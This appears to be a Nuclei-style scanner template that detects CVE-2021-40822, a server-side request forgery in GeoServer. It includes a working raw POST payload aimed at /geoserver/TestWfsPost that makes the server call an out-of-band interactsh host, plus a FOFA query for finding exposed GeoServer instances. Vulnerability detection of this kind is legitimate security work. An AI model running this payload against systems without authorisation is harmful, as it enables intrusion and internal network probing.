id: CVE-2021-40822
info:
  author: For3stCo1d
  classification:
    cve-id: CVE-2021-40822
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-918
  description: GeoServer through 2.18.5 and 2.19.x through 2.19.2 allows server-side
    request forgery via the option for setting a proxy host.
  metadata:
    fofa-query: app="GeoServer"
    verified: 'true'
  name: Geoserver - Server-Side Request Forgery
  reference:
  - https://gccybermonks.com/posts/cve-2021-40822/
  - https://github.com/geoserver/geoserver/compare/2.19.2...2.19.3
  - https://github.com/geoserver/geoserver/releases
  - https://nvd.nist.gov/vuln/detail/CVE-2021-40822
  severity: high
  tags: cve,cve2021,ssrf,geoserver
requests:
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - http
  - type: word
    words:
    - <html><head></head><body>
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /geoserver/TestWfsPost HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    form_hf_0=&url=http://{{interactsh-url}}/geoserver/../&body=&username=&password=

    '
